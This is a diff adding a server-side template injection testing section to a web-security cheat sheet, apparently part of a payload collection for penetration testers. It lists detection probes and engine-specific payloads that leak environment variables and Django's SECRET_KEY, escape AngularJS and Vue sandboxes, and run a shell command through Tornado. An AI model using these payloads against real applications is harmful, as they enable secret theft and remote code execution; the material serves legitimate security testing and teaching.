@@ -1,10 +1,104 @@
 # Template Injection
 
-## Polyglot payload
+## Testing for SSTI
+
+Try submitting a fuzzed payload such as `${{<%[%'"}}%\` if a stack trace error is displayed then the application is vulnerable.
+
+To distinguish between XSS and SSTI submit payloads that trigger mathematical operations such as `${2*2}` if the output is 4 then the vulnerability is aa SSTI
+
+If the user input is included inside a code block follow this steps
+
+1. Verify that the attack is not an XSS by passing a payload including HTML tags such as `str<b>test</b>` if the tags and the content included are not rendered then the vulnerability is not an XSS
+2. Try to escape from the code block by submitting a payload as follow (adjust based on the engine's syntax): `}}<b>test</b>`
+3. If the content of the code block is rendered correctly alongside the injected tags then the application is vulnerable to SSTI
+
+## Engine identification
+
+#### Generic
 
 ```
 ${{<%[%'"}}%\
-{{ 7-7 }}    //0 should appear where the template is evaluated
+```
+
+#### AngularJS
+
+```
+{{$on.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+```
+
+#### VueJS
+
+```
+{{_openBlock.constructor('alert(1)')()}}     //V3
+{{constructor.constructor('alert(1)')()}}    //V2
+```
+
+#### Mavo
+
+```
+[self.alert(1)]
+javascript:alert(1)%252f%252f..%252fcss-images
+```
+
+#### Java
+
+```
+${7*7}
+${T(java.lang.System).getenv()}
+${class.getClassLoader()}
+```
+
+#### ERB
+
+```
+<%= 7*7 %>
+<%= foobar %>
+```
+
+#### Twig
+
+```
+{{7*7}}
+{{7*'7'}}
+```
+
+#### Smarty
+
+```
+{$smarty.version}
+```
+
+#### Django - Python
+
+```
+{% raw %}
+{% debug %}
+{% endraw %}
+{{settings.SECRET_KEY}}
+```
+
+#### Tornado - Python
+
+```
+{% raw %}
+{% import foobar %} = Error
+{% import os %}
+{% endraw %}{{os.system('whoami')}}
+```
+
+#### Flask/Jinja2
+
+```
+{{ '7'*7 }}
+{{ [].class.base.subclasses() }} # get all classes
+{{''.class.mro()[1].subclasses()}}
+```
+
+#### Razor
+
+```
+@(1+2)
 ```
 
 ## Client Side Payloads
